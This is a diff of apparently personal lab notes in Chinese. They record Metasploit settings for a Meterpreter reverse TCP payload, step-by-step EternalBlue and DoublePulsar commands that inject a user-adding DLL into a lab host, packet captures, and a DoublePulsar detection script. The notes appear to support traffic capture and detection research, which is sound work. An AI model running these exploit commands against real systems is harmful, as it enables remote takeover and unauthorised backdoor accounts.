@@ -160,3 +160,27 @@ set payload windows/x64/meterpreter/reverse_tcp
 set lhost 192.168.200.130
 set PROCESSINJECT explorer.exe # 注意，需要设置PROCESSINJECT，使用默认值并没成功，改PROCESSINJECT为explorer.exe成功
 run
+
+
+
+###
+
+第一步：
+D:\Desktop\Win-RCE-eternalblue_and_eternalromantic>
+D:\Desktop\Win-RCE-eternalblue_and_eternalromantic\eb.exe --targetip 192.168.56.141
+数据包：eb.pcap
+
+第二步：
+D:\Desktop\Win-RCE-eternalblue_and_eternalromantic>D:\Desktop\Win-RCE-eternalblue_and_eternalromantic\dp.exe --TargetIp 192.168.56.141 --Function RunDLL --DllPayload D:\Desktop\Win-RCE-eternalblue_and_eternalromantic\useradd64.dll
+数据包：dp.pcap
+
+第三步：检测
+C:\Users\Administrator>python D:\Desktop\doublepulsar-detection-script-master\detect_doublepulsar_smb.py --ip 192.168.56.141
+数据包：detect.pcap
+
+
+## 我的本机
+
+.\eb.exe --targetip 192.168.56.141
+ .\dp.exe --TargetIp 192.168.56.141 --Function RunDLL --DllPayload useradd64.dll
+python2 .\detect_doublepulsar_smb.py --ip 192.168.56.141
